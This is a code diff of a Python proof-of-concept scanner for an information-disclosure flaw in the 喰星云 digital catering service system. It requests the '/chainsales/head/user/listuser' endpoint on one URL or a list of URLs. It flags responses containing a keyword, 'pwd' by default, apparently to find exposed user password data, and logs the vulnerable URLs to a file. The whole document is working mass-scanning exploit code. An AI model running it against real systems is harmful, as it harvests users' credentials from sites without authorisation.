@@ -1,4 +1,4 @@
-#还未修改完成
+#喰星云-数字化餐饮服务系统listuser信息泄露漏洞检测POC
 
 import requests
 import argparse
@@ -11,15 +11,19 @@ headers = {
 }
 
 def check_keyword_in_response(url, keyword, output_file):
+    path = '/chainsales/head/user/listuser'
     try:
-        response = requests.get(url, headers=headers)
+        response = requests.get(url.strip('/')+path, headers=headers, timeout=5)
 
         if response.status_code == 200 and keyword in response.text:
-            print(f"Keyword '{keyword}' found in the response from {url}.")
+            print(f"\033[92m[+] {url} 存在关键字 '{keyword}'\n \033[0m")
+            if output_file:
+                with open(output_file, 'a') as file:
+                    file.write(url + '\n')
         else:
-            print(f"Keyword '{keyword}' not found or received non-200 status code from {url}.")
+            print(f"[-] {url}不存在关键字 '{keyword}' \n")
     except requests.exceptions.RequestException as e:
-        print(f"An error occurred with {url}: {e}")
+        print(f"错误消息：{url}: {e}\n")
 
 
 def load_urls_from_file(file_path):
@@ -28,27 +32,23 @@ def load_urls_from_file(file_path):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Check if the HTTP response contains a specific keyword.")
+    parser = argparse.ArgumentParser(description="用法：python poc.py -u url -k keyword -o output_file")
 
-    parser.add_argument("-u", "--url", type=str, help="Single URL to check.")
-    parser.add_argument("-f", "--file", type=str, help="File containing a list of URLs, one per line.")
-    parser.add_argument("-k", "--keyword", type=str, default="pwd", help="Keyword to search for in the response.")
-    parser.add_argument("-o", "--output", type=str, help="File to export URLs where keyword is found.")
+    parser.add_argument("-u", "--url", type=str, help="单个URL")
+    parser.add_argument("-f", "--file", type=str, help="包含多个URL的文件")
+    parser.add_argument("-k", "--keyword", type=str, default="pwd", help="匹配响应报文的关键字，默认为'pwd'")
+    parser.add_argument("-o", "--output", type=str, help="导出存在漏洞URL的文件名")
 
     args = parser.parse_args()
 
-    # Load URLs either from the command line or from a file
     if args.url:
         urls = [args.url]
     elif args.file:
         urls = load_urls_from_file(args.file)
     else:
-        print("You must provide either a single URL with -u or a file containing URLs with -f.")
-        sys.exit(1)
+        print("您必须使用 -U 提供单个 URL，或使用 -f 提供包含 URL 的文件\n")
+        exit(1)
 
     for url in urls:
-        check_keyword_in_response(url, args.keyword,args.ouput_file)
-
-
-
+        check_keyword_in_response(url, args.keyword, args.output)
 
